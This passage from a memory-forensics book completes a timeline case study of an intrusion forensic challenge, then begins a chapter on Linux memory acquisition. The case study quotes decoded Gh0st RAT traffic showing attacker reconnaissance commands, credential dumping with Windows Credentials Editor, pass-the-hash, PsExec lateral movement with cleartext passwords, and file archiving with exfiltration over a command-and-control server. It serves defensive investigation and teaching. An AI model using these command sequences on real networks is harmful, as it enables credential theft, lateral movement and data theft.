A little further in the network traffic, you see that the DLL files created in the `C:\WINDOWS\webui` directory actually contained reconnaissance information. You also discover that the `sl.exe` executable is actually the ScanLine Portscanner by Foundstone ([http://www.mcafee.com/us/downloads/free-tools/scanline.aspx](http://www.mcafee.com/us/downloads/free-tools/scanline.aspx)). The password hashes extracted using the previously discussed `gs.exe` are also collected in the `netuse.dll` file, which the attacker eventually downloads:

```
C:\WINDOWS\webui>
ipconfig /all >> netuse.dll
net view >> netuse.dll
C:\WINDOWS\webui>
net localgroup administrators >> netuse.dll
C:\WINDOWS\webui>
net sessions >> netuse.dll
C:\WINDOWS\webui>
net share >> netuse.dll
C:\WINDOWS\webui>
net start >> netuse.dll
C:\WINDOWS\webui>
sl.exe -bht 445,80,443,21,1433 172.16.150.1-254 >> netuse.dll
ScanLine (TM) 1.01
Copyright (c) Foundstone, Inc. 2002
http://www.foundstone.com

5 IPs and 25 ports scanned in 0 hours 0 mins 13.08 secs

C:\WINDOWS\webui>
gs -a >> netuse.dll
0043B820
[snip]
COMMAND: DOWN FILES (C:\WINDOWS\webui\netuse.dll)
TOKEN: FILE SIZE (C:\WINDOWS\webui\netuse.dll: 11844)
COMMAND: CONTINUE
[snip]
TOKEN: TRANSFER FINISH
```

The attacker also uses `ping` to test connectivity to other machines on the network by machine name (that is, `dc-ustxhou` and `IIS-SARIYADH-03`). This verifies that the attacker was actively leveraging the previously extracted reconnaissance information:

```
ping DC-USTXHOU
Pinging dc-ustxhou.petro-market.org [172.16.150.10] with 32 bytes of data:
Reply from 172.16.150.10: bytes=32 time<1ms TTL=128
C:\WINDOWS\webui>
ping IIS-SARIYADH-03
Pinging IIS-SARIYADH-03.petro-market.org [172.16.223.47] with 32 bytes of data:
Reply from 172.16.223.47: bytes=32 time=2ms TTL=127
```

Based on the data in the decoded traffic, you get confirmation that the `wc.exe` file dropped on the system was actually the Windows Credentials Editor. The attacker dumped the credentials and then attempted to use them to log in to another machine with `ps.exe` (`PsExec` in disguise):

```
wc.exe -l
WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security 
  - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

callb:PETRO-MARKET:115B24322C11908C85140F5D33B6232F:40D1D232D5F731EA966
913EA458A16E7
ENG-USTXHOU-148$:PETRO-MARKET:00000000000000000000000000000000:D6717F1E
5252FA87ED40AF8C46D8B1E2

C:\WINDOWS\webui>
wc.exe -w
WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security 
  - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.
callb\PETRO-MARKET:Mar1ners@4655
NETWORK SERVICE\PETRO-MARKET:+A;dhzj%o<8xpD@,p5v)C:p2%?1Nkx [snip]
ENG-USTXHOU-148$\PETRO-MARKET:+A;dhzj%o<8xpD@,p5v)C:p2%?1Nk[[snip]
ps.exe \\172.16.150.10 -u petro1-market\callb -p Mar1ners@4655 -accepteula 
  cmd /c ipconfig
[snip]
The handle is invalid.
Connecting to 172.16.150.10...Couldn't access 172.16.150.10
C:\WINDOWS\webui>
```

The attempt to connect to 172.16.150.10 (`DC-USTXHOU`) failed. (This machine is not examined in this chapter because it was not compromised during the attack.)

The decoded network stream also shows the attacker changing the credentials for the `sysbackup` user after several failed attempts to use `PsExec`:

```
wc.exe -s sysbackup:current:c2a3915df2ec79ee73108eb48073acb7:
e7a6f270f1ba562a90e2c133a95d2057

WCE v1.3beta (Windows Credentials Editor) - (c) 2010,2011,2012 Amplia Security 
  - by Hernan Ochoa (hernan@ampliasecurity.com)
Use -h for help.

Changing NTLM credentials of current logon session (000003E7h) to:
Username: sysbackup
domain: current
LMHash: c2a3915df2ec79ee73108eb48073acb7
NTHash: e7a6f270f1ba562a90e2c133a95d2057
NTLM credentials successfully changed!
```

After a few failed attempts to connect to a system with the `sysbackup` user, the attacker is eventually successful at using `PsExec` to run commands on `IIS-SARIYADH-03`:

```
ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula cmd /c ipconfig
PsExec v1.98 - Execute processes remotely
Copyright (C) 2001-2010 Mark Russinovich
Sysinternals - www.sysinternals.com

The file exists.
Connecting to 172.16.223.47...^M^M^MStarting PsExec service on 
172.16.223.47...^M^M^MConnecting with PsExec service on 
172.16.223.47...^M^M^MCopying C:\WINDOWS\system32\ipconfig.exe to 
172.16.223.47...^M^M^MError copying C:\WINDOWS\system32\ipconfig.exe to 
remote system:
```

To see the attacker’s commands within the context of the timeline, you can modify the Chopshop decoder to output the decoded streams in body format. The following shows how to run a modified module, renamed as `gh0st_decode_body`, and add it to the full timeline:

```
$ chopshop -f jackcr-challenge.pcap gh0st_decode_body -F decrypted.body
$ cat decrypted.body >> largetimeline.txt
```

You can then find commands that were pointed out in this section in the timeline. For example, the following shows both an attacker’s `ipconfig` command and the changes it made. Notice that DLLs used for accessing network APIs are accessed after the `ipconfig` command is run. Also notice that the fake DLL, `netuse.dll`, which was used to store the output of the `ipconfig` command, is created on the system:

```
Mon Nov 26 2012 23:07:31,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: ipconfig /all >> netuse.dll
Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\iertutil.dll 
    (Offset: 0x5ba2800)
Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\urlmon.dll 
    (Offset: 0x328a800)
Mon Nov 26 2012 23:07:31,.a..,[ENG MFT STD_INFO] WINDOWS\system32\wininet.dll 
    (Offset: 0x328b800)
Mon Nov 26 2012 23:07:31,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netuse.dll 
    (Offset: 0xde4e48)
Mon Nov 26 2012 23:07:31,macb,[ENG MFT STD_INFO] WINDOWS\webui\netuse.dll 
    (Offset: 0xde4e48)
```

In the following lines, the attacker issues several `net` commands and redirects the output to the same fake `netuse.dll` file. At this time, Prefetch files for the `net` executables (`NET.EXE` and `NET1.EXE`) are created on the machine:

```
Mon Nov 26 2012 23:07:52,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net view >> netuse.dll
Mon Nov 26 2012 23:07:53,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net view >> netuse.dll
Mon Nov 26 2012 23:07:53,macb,[ENG MFT FILE_NAME] 
WINDOWS\Prefetch\NET.EXE-01A53C2F.pf (Offset: 0x12d588)
Mon Nov 26 2012 23:08:25,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: 
    net localgroup administrators >> netuse.dll
Mon Nov 26 2012 23:08:26,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 
SHELL: net localgroup administrators >> netuse.dll
Mon Nov 26 2012 23:08:26,macb,[ENG MFT STD_INFO] WINDOWS\Prefetch\NET1EX~1.PF 
    (Offset: 0x2bbee0)
Mon Nov 26 2012 23:08:41,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net sessions >> netuse.dll
Mon Nov 26 2012 23:08:56,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net share >> netuse.dll
Mon Nov 26 2012 23:09:18,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net start >> netuse.dll
Mon Nov 26 2012 23:09:19,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: net start >> netuse.dll
```

Adding the attacker’s commands to the timeline can help add yet another dimension of understanding of what happened on a machine. Now you’re ready to examine the entire combined timeline.

### Correlating the Traffic with the Timeline

Using the previous information about `PsExec` being used to execute commands on `IIS-SARIYADH-03`, you can search for any related artifacts within the timeline. Here you can see the `PsExec` commands that the attacker issued to `IIS` (IP 172.16.223.47):

```
Tue Nov 27 2012 00:05:48,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 
SHELL: ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula 
    cmd /c ipconfig
Tue Nov 27 2012 00:05:48,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 
SHELL: ps.exe \\172.16.223.47 -u sysbackup -p T1g3rsL10n5 -accpeteula 
    cmd /c ipconfig;;PsExec v1.98 -
 Execute processes remotely;Copyright (C) 2001-2010 Mark Russinovich;
 Sysinternals - www.sysinternals.com;
```

---

**NOTE**

Multilined, decrypted Gh0st output is delimited by semicolons to make it fit in one line for bodyfile format.

---

Here is the `PSEXESVC.EXE` file created on the IIS system:

```
Tue Nov 27 2012 00:05:48,macb,[IIS MFT FILE_NAME] WINDOWS\PSEXESVC.EXE 
    (Offset: 0x1da1b000)
Tue Nov 27 2012 00:05:48,macb,[IIS MFT STD_INFO] WINDOWS\PSEXESVC.EXE 
    (Offset: 0x1da1b000)
```

The service starts on `IIS`, including the output message from `PsExec` to the attacker’s shell as well as the `PSEXESVC.EXE` process starting on the `IIS` machine:

```
Tue Nov 27 2012 00:05:49,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 
    SHELL: The file exists.;Connecting to 172.16.223.47...
Starting PsExec service on 172.16.223.47...
    Connecting with PsExec service on 172.16.223.47...
    Copying C:\WINDOWS\system32\ipconfig.exe to 172.16.223.47...
    Error copying C:\WINDOWS\system32\ipconfig.exe to remote system:;;
    C:\WINDOWS\webui>
Tue Nov 27 2012 00:05:49,0,macb,,0,0,0,[IIS PROCESS LastTrimTime] PSEXESVC.EXE 
    PID: 268/PPID: 528/POffset: 0x0237f2b0
Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE 
    PID: 268/PPID: 528/POffset: 0x0237f2b0
Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE 
    PID: 268/PPID: 528/POffset: 0x0dd2e2b0
Tue Nov 27 2012 00:05:49,0,.acb,,0,0,0,[IIS PROCESS] PSEXESVC.EXE 
    PID: 268/PPID: 528/POffset: 0x172de2b0
```

Some registry keys associated with `PsExec` are modified on `IIS-SARIYADH-03` at the same time the process is started:

```
Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_PSEXESVC
Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry None] 
$$$PROTO.HIV\ControlSet001\Enum\Root\LEGACY_PSEXESVC\0000
Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry] 
$$$PROTO.HIV\ControlSet001\Services\PSEXESVC
Tue Nov 27 2012 00:05:49,0,.a..,0,0,0,0,[IIS Registry] 
$$$PROTO.HIV\ControlSet001\Services\PSEXESVC\Security
```

The attacker maps a network share from `IIS-SARIYADH-03` to the `z:` drive letter of the `FLD-SARIYADH-43` machine:

```
Tue Nov 27 2012 00:46:10,.a..,[FLD Registry] $$$PROTO.HIV\Network\z
Tue Nov 27 2012 00:46:10,macb,[FLD SYMLINK] 
Z:->\Device\LanmanRedirector\;Z:00000000000003e7\172.16.223.47\z 
    POffset: 284628328/Ptr: 1/Hnd: 0
```

Within 2 seconds, the `net use` command is used to map a network share from `IIS-SARIYADH-03` to the `z:` drive letter. The command results in a modification to the `Network\z` registry key that you saw earlier on the `ENG-USTXHOU-148` machine:

```
Tue Nov 27 2012 00:48:19,macb,[Gh0st Decode] 
172.16.150.20:1098->58.64.132.141:80 SHELL: net use z: \\172.16.223.47\z
Tue Nov 27 2012 00:48:20,.a..,[ENG Registry] $$$PROTO.HIV\Network\z
Tue Nov 27 2012 00:48:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: The command completed 
    successfully.;;;C:\WINDOWS\webui>
```

The attacker copies off files immediately after mapping the drive:

```
Tue Nov 27 2012 00:49:01,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\system.dll .
Tue Nov 27 2012 00:49:01,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: 1 file(s) copied.;;
    C:\WINDOWS\webui>
Tue Nov 27 2012 00:49:01,macb,[ENG MFT FILE_NAME] WINDOWS\webui\system.dll 
    (Offset: 0x924e800)
 [snip]
Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\svchost.dll .
Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: 1 file(s) copied.;;C:\
WINDOWS\webui>
Tue Nov 27 2012 00:57:20,.a..,[IIS MFT STD_INFO] WINDOWS\webui\svchost.dll 
    (Offset: 0x1dec3000)
Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll 
    (Offset: 0x924ec00)
[snip]
Tue Nov 27 2012 01:01:39,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\https.dll .
Tue Nov 27 2012 01:01:39,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\https.dll .;        
    1 file(s) copied.;;C:\WINDOWS\webui>
Tue Nov 27 2012 01:01:39,macb,[ENG MFT FILE_NAME] WINDOWS\webui\https.dll 
    (Offset: 0x109cf7a8)
Tue Nov 27 2012 01:14:48,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\ .
Tue Nov 27 2012 01:14:48,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\netstat.dll .;        
    1 file(s) copied.;;C:\WINDOWS\webui>
Tue Nov 27 2012 01:14:48,macb,[ENG MFT FILE_NAME] WINDOWS\webui\netstat.dll 
    (Offset: 0x10b97400)
```

These were the same filenames used in the batch scripts found on `FLD-SARIYADH-43`. It appears the attacker executed the commands on `IIS-SARIYADH-03`. If you look at the combined timeline, you can see that both `system1.bat` and `system6.bat` are accessed on `FLD-SARIYADH-43` immediately before `PsExec` is run. At about the same time, the `net1.exe` command (a component of `net.exe`) is accessed on `IIS-SARIYADH-03`:

```
Tue Nov 27 2012 00:43:34,mac.,[FLD MFT STD_INFO] WINDOWS\system1.bat 
    (Offset: 0x1787f000)
Tue Nov 27 2012 00:43:45,macb,[FLD MFT FILE_NAME] WINDOWS\system6.bat 
    (Offset: 0x1787f800)
Tue Nov 27 2012 00:44:16,mac.,[FLD MFT STD_INFO] WINDOWS\Prefetch\PSEXE-~2.PF
Tue Nov 27 2012 00:44:16,.a..,[IIS MFT STD_INFO] WINDOWS\system32\net1.exe 
```

Given the changes to the registry on the `FLD-SARIYADH-43` machine associated with the network share, which occur shortly after the `net` command on the `IIS-SARIYADH-03` machine, you can conclude that the `system1.bat` file was executed on the `IIS-SARIYADH-03` machine via `PsExec`.

Later in the timeline, the `system2.bat` file is accessed on the `FLD-SARIYADH-43` machine; shortly thereafter, the `gs.exe` and `svchost.dll` files appear on the `IIS-SARIYADH-03` machine. This confirms that the `system2.bat` file was run on the `IIS-SARIYADH-03` machine because its code runs the `gs.exe` program and redirects its output into the `svchost.dll` file, which is then copied off to the `ENG-USTXHOU-148` machine, as you saw earlier:

```
Tue Nov 27 2012 00:53:29,368,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system2.bat 
    (Offset: 0x1787fc00)
Tue Nov 27 2012 00:53:49,336,macb,[IIS MFT FILE_NAME] WINDOWS\webui\gs.exe 
    (Offset: 0x1be1d400)
Tue Nov 27 2012 00:55:41,344,macb,[IIS MFT FILE_NAME] WINDOWS\webui\svchost.dll 
    (Offset: 0x1dec3000)
Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL: copy z:\svchost.dll .
Tue Nov 27 2012 00:57:20,macb,[Gh0st Decode] 
    172.16.150.20:1098->58.64.132.141:80 SHELL:         
    1 file(s) copied.;;C:\WINDOWS\webui>
Tue Nov 27 2012 00:57:20,.a..,[IIS MFT STD_INFO] WINDOWS\webui\svchost.dll 
    (Offset: 0x1dec3000)
Tue Nov 27 2012 00:57:20,macb,[ENG MFT FILE_NAME] WINDOWS\webui\svchost.dll 
    (Offset: 0x924ec00)
```

Temporal artifacts associated with the `system3.bat` script executing can be observed on `IIS-SARIYADH-03`. First, the script is accessed on the `FLD-SARIYADH-43` machine, and then a burst of activity occurs on the `IIS-SARIYADH-03` machine as several directories are accessed. As discussed earlier in this chapter, the `system3.bat` script redirected output from a `dir` command looking for files with a `dwg` extension. You can see this in the following timeline output because several files are accessed as the script issues the recursive `dir` command:

```
Tue Nov 27 2012 00:59:00,352,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system3.bat 
    (Offset: 0x1b773000)
Tue Nov 27 2012 01:00:27,600,.a..,[IIS MFT STD_INFO] 
    Documents and Settings\ADMINI~1 (Offset: 0x1d836800)
Tue Nov 27 2012 01:00:27,480,.a..,[IIS MFT STD_INFO] 
    Documents and Settings\ADMINI~1\Start Menu\Programs 
    (Offset: 0x1c5c08e000)
Tue Nov 27 2012 01:00:27,448,.a..,[IIS MFT STD_INFO] Documents and 
    Settings\ADMINI~1\Start Menu\Programs\Startup (Offset: 0x1c5e0c00)
Tue Nov 27 2012 01:00:27,824,.a..,[IIS MFT STD_INFO] Documents and Settings
    \ADMINI~1\Start Menu\Programs\Accessories\ENTERT~1 (Offset: 0x1ce3c400)
Tue Nov 27 2012 01:00:27,600,.a..,[IIS MFT STD_INFO] Documents and Settings
    \ADMINI~1\Start Menu\Programs\Accessories\ACCESS~1 (Offset: 0x1ce3c800)
Tue Nov 27 2012 01:00:27,472,.a..,[IIS MFT STD_INFO] Documents and Settings
    \ADMINI~1\SendTo (Offset: 0x1ce3cc00)
```

If you then search for the `system4.bat` file in the combined timeline, you will find evidence of its usage. After the `system4.bat` file is created and accessed on the `FLD-SARIYADH-43` machine, the `ra.exe` file appears on the `IIS-SARIYADH-03` machine as a result of the `system4.bat` script running via `PsExec`:

```
Tue Nov 27 2012 01:04:59,432,macb,[FLD MFT FILE_NAME] WINDOWS\webui\system4.bat 
    (Offset: 0x1b773400)
Tue Nov 27 2012 01:05:24,336,macb,[IIS MFT FILE_NAME] WINDOWS\webui\ra.exe 
    (Offset: 0x1bf7e000)
Tue Nov 27 2012 01:05:55,344,macb,-------------D-,0,0,10877,[IIS MFT FILE_NAME] 
Documents and Settings\SYSBAC~1\APPLIC~1\WinRAR (Offset: 0x1cedc400)
```

The WinRAR folder is created when the WinRAR program is run on a system. Based on the contents of `system4.bat`, files were compressed into the `netstat.dll` fake DLL with WinRAR, which was run with the following options (see [http://acritum.com/software/manuals/winrar/](http://acritum.com/software/manuals/winrar/)):

- `-hphclllsddlsdiddklljh`: The password is “hclllsddlsdiddklljh” and is set by `–hp`.
- `-r`: Recurse through directories.
- `-x*.dll`: Exclude DLL files.

Several files in the timeline with the `dwg` extension are accessed and the archive file (`netstat.dll`) is created:

```
Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump100.dwg (Offset: 0x1a890c00)
Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump11.dwg (Offset: 0x1a8fb800)
Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump12.dwg (Offset: 0x1a8fbc00)
Tue Nov 27 2012 01:11:20,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump13.dwg (Offset: 0x1a18f000)
Tue Nov 27 2012 01:11:21,.a..,[IIS MFT STD_INFO] 
    ENGINE~1\Designs\Pumps\pump14.dwg (Offset: 0x1a18f400)
[snip]
Tue Nov 27 2012 01:11:39,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump97.dwg (Offset: 0x25c78f000)
Tue Nov 27 2012 01:11:39,.a..,[IIS MFT STD_INFO] 
ENGINE~1\Designs\Pumps\pump98.dwg (Offset: 0x25f7c00)
Tue Nov 27 2012 01:11:40,.a..,[IIS MFT STD_INFO] 
    ENGINE~1\Designs\Pumps\pump99.dwg (Offset: 0x25c80f000)
Tue Nov 27 2012 01:11:40,mac.,[IIS MFT STD_INFO] 
WINDOWS\webui\netstat.dll (Offset: 0x1cedc800)
Tue Nov 27 2012 01:11:40,m...,[ENG MFT STD_INFO] 
WINDOWS\webui\netstat.dll (Offset: 0x10b97400)
```

The `netstat.dll` file (a RAR archive) is later downloaded to the attacker’s local machine over the command and control server:

```
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 COMMAND: DOWN FILES 
    (C:\WINDOWS\webui\netstat.dll)
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE DATA (2713)
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE DATA (8183)
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 TOKEN: FILE SIZE  
    (C:\WINDOWS\webui\netstat.dll: 109092)
Tue Nov 27 2012 01:15:44,macb,[Gh0st Decode] 
    172.16.150.20:1238->58.64.132.141:80 TOKEN: TRANSFER FINISH
```

### Wrapping Up the Case

In this case, you figured out the following from the timeline:

- The attacker had access to two machines (`ENG-USTXHOU-148` and `FLD-SARIYADH-43`) due to an executable that was sent by a phishing e-mail (`SYMANTEC-1.43-1[2].EXE`).
- The attacker modified credentials to move laterally to the third machine (`IIS-SARIYADH-03`).
- The attacker obtained information about the network and dumped hashes from all three machines.
- A network share from `IIS-SARIYADH-03` was mounted on both the `ENG-USTXHOU-148` and `FLD-SARIYADH-43`machines for copying off files back to the attacker.
- The attacker downloaded several files containing information about the network and password hashes as well as several (possibly proprietary) files with a `dwg` extension.
- Files were copied back to the (`ENG-USTXHOU-148`) machine and ultimately to the attacker’s machine.

---

**NOTE**

For more details on this forensic challenge, see the following resources:

- *Forensic Challenge 2* by TheLulzKittens: [http://thelulzkittens.blogspot.com/2012/11/jackcr-forensic-challenge-2-forensics.html](http://thelulzkittens.blogspot.com/2012/11/jackcr-forensic-challenge-2-forensics.html)
- Jack Crook’s blog (creator of the challenge): [http://blog.handlerdiaries.com](http://blog.handlerdiaries.com)

Also see Corey Harrell’s *Mr Silverlight Drive-by Meet Volatility Timelines* ([http://journeyintoir.blogspot.com/2014/05/mr-silverlight-drive-by-meet-volatility.html](http://journeyintoir.blogspot.com/2014/05/mr-silverlight-drive-by-meet-volatility.html)). Corey’s post was the first analysis we’ve seen that incorporated Tom Spencer’s new Update Sequence Number (USN) Journal parser plugin for Volatility ([https://github.com/tomspencer/volatility/tree/master/usnparser](https://github.com/tomspencer/volatility/tree/master/usnparser)).

---

## Summary

Creating timelines is a powerful analysis technique used during the reconstruction phase of digital investigations. It provides an extra layer of context about the relationships between artifacts and the temporal order in which events occurred. By combining temporal data found in memory with traditional sources, you get a more complete view of the digital crime scene and can develop stronger theories about what happened during the incident. The temporal relationships between digital artifacts also provide “temporal footprints” for rapidly identifying suspected systems.
# III Linux Memory Forensics

- Chapter 19: Linux Memory Acquisition
- Chapter 20: Linux Operating System
- Chapter 21: Processes and Process Memory
- Chapter 22: Networking Artifacts
- Chapter 23: Kernel Memory Artifacts
- Chapter 24: File Systems in Memory
- Chapter 25: Userland Rootkits
- Chapter 26: Kernel Mode Rootkits
- Chapter 27: Case Study: Phalanx 2
# Chapter 19  
 Linux Memory Acquisition

This chapter provides the fundamental knowledge you need to begin analyzing Linux memory dumps. In particular, we discuss historical and modern memory acquisition techniques on Linux, as well as the advantages and disadvantages of each approach. You will learn how to create Linux profiles, which are archives that contain the necessary information Volatility needs to properly find and interpret data in Linux memory dumps. Additionally, we discuss the challenges of deploying Linux memory forensics in an enterprise environment, where critical servers may not even have C compilers or other libraries that are found on standard Linux desktops and workstations.

---

**NOTE**

Unless otherwise noted, the best practices you learned regarding safe memory acquisition procedures on Windows in Chapter 4 also apply to Linux systems.

---

## Historical Methods of Acquisition

Initial methods of memory acquisition on Linux did not require third-party software. Instead, interfaces built into the operating system allowed for reading and writing of physical memory by privileged applications. For example, you could read `/dev/mem` (described in the next section) with `cat` or `dd` and redirect it to a file or over the network. Due to the security hazard posed by such interfaces, they are now disabled or crippled in order to prevent abuse. As a side effect, disabling or crippling the interfaces also prevents forensics investigators from using them as facilitators of memory acquisition.

### /dev/mem

Before being disabled on nearly all distributions due to security concerns, the most popular interface for memory acquisition was `/dev/mem`. When enabled, this device exports physical memory and allows programs (such as `dd`) with root privileges to directly read from and write to RAM. Unfortunately, `/dev/mem` also presented challenges for inexperienced investigators. First, many machines do not map RAM contiguously from physical offset 0. As a result, an investigator might access sensitive regions, causing memory corruption or general system instability, as described in Chapter 4.

Another issue with `/dev/mem` is that it can only address the first 896MB of RAM, even if the system’s physical memory capacity is far greater. Although early forensic investigations frequently involved machines with less than 896MB of RAM, it is almost unheard of now, and the inability to acquire memory beyond that range is a limitation associated with using `/dev/mem`.

### /dev/kmem

The `/dev/kmem` character device was historically used to acquire a subset of memory on 32-bit systems before being disabled. Whereas `/dev/mem` exports raw physical memory, /dev/kmem exports the kernel virtual address space. Similar to `/dev/mem`, the security risk associated with allowing userland direct access to kernel memory led to the decision to disable `/dev/kmem` by default on modern distributions.

### ptrace

`ptrace` is the userland debugging interface that Linux provides. The interface is not suitable for robust memory acquisition, because it can acquire pages only from running processes, which misses all kernel memory, freed pages, and other data. The only time you should use `ptrace` as an acquisition method is when you are interested in the code and data of only one process, such as related to a piece of malware.

If you want to experiment with a `ptrace`-based memory acquisition tool, you can try the `memfetch` application available here: [http://lcamtuf.coredump.cx/soft/memfetch.tgz](http://lcamtuf.coredump.cx/soft/memfetch.tgz). This application runs natively on Intel Linux and is trivially portable to ARM. It operates by reading the starting and ending addresses of process’ memory ranges from `/proc/<pid>/maps` and then uses `ptrace` to dump each page to disk. Later in the book, you will learn how the kernel populates `/proc/<pid>/maps` and how to use the `linux_dump_map` Volatility plugin to achieve similar effects from a full memory sample.

## Modern Acquisition

The inadequacies of the previously described historical methods of acquisition on 32-bit systems caused developers in the forensics community to create specialized memory acquisition tools. The tools provide practitioners more flexibility over the acquisition process, but also require that you load third-party software onto target systems in order to collect the evidence. With the advent of 64-bit systems, another userland device, `/proc/kcore`, once again opened the possibility of acquisition of physical memory directly from userland. In this section we discuss `/proc/kcore`, the `fmem` and `LiME` acquisition tools, and the advantages and disadvantages of each.

### fmem

To alleviate issues encountered when using `/dev/mem` on 32-bit systems, the `fmem` ([http://hysteria.sk/~niekt0/foriana/fmem_current.tgz](http://hysteria.sk/~niekt0/foriana/fmem_current.tgz)) project was created. `fmem` operates by loading a kernel driver that creates a character device named `/dev/fmem`. This device operates similarly to `/dev/mem`, in that it exports physical memory for other programs to access, but it has a number of advantages. The first advantage is that it checks if physical pages reside in main memory (by calling the `page_is_ram` function) before accessing them. This prevents investigators from accidentally reading device memory or unmapped physical addresses, which causes stability issues (see Chapter 4). Another advantage of `fmem` is that it can access physical pages above the 896MB boundary, unlike `/dev/mem`.

The only disadvantage to `fmem` is that it requires the investigator to inspect `/proc/iomem` to determine where RAM is mapped. As previously discussed, this is necessary for machines that do not map all main memory at physical offset 0. On some systems, RAM is broken into many different segments that are loaded high into physical memory. For example, the following is the initial output of `/proc/iomem` on a VMware workstation Debian guest with 3084MB of physical memory and PAE enabled:

```
$ cat /proc/iomem
00000000-0000ffff : reserved
00010000-0009f3ff : System RAM
0009f400-0009ffff : reserved
000a0000-000bffff : PCI Bus 0000:00
  000a0000-000bffff : Video RAM area
000c0000-000c7fff : Video ROM
000ca000-000cbfff : reserved
  000ca000-000cafff : Adapter ROM
000cc000-000cffff : PCI Bus 0000:00
000d0000-000d3fff : PCI Bus 0000:00
[snip]
```

In this output, you can see the starting and ending physical address of each memory range along with the name. The ones you should be interested in for acquisition are those named `System RAM`. To find these ranges exclusively, you can search for them in the file:

```
$ grep "System RAM" /proc/iomem
00010000-0009f3ff : System RAM
00100000-bfedffff : System RAM
bff00000-bfffffff : System RAM
100000000-100bfffff : System RAM
```

Within this guest, there are four ranges of physical memory that you need to acquire. Note that the last range (`100000000` - `100bfffff`) is above the normal limit for 32-bit systems (which is `0xffffffff`) and actually is at about 4.3GB into physical memory. So if you use `dd` to acquire 3084MB of RAM with `fmem`, you would miss data in the last region. It would take a knowledgeable investigator to notice this error because the file would be the correct size of RAM (3084MB), and memory analysis tools (including Volatility) would appear to work for the most part. However, the memory sample would be incomplete.

Although `fmem` is a great addition to the memory acquisition and research space, it is a very manual tool and it requires you to have intimate knowledge of the physical memory layout to use it properly.

### Linux Memory Extractor (LiME)

Linux Memory Extractor, otherwise known as LiME ([https://code.google.com/p/lime-forensics](https://code.google.com/p/lime-forensics)), is the latest Linux memory acquisition tool. It fixes the issues and challenges involved with the previously discussed tools and techniques. Joe Sylve, Vico Marziale, Andrew Case, and Golden G. Richard III discuss the original implementation of LiME in a paper that you can read here: [http://www.dfir.org/research/android-memory-analysis-DI.pdf](http://www.dfir.org/research/android-memory-analysis-DI.pdf).

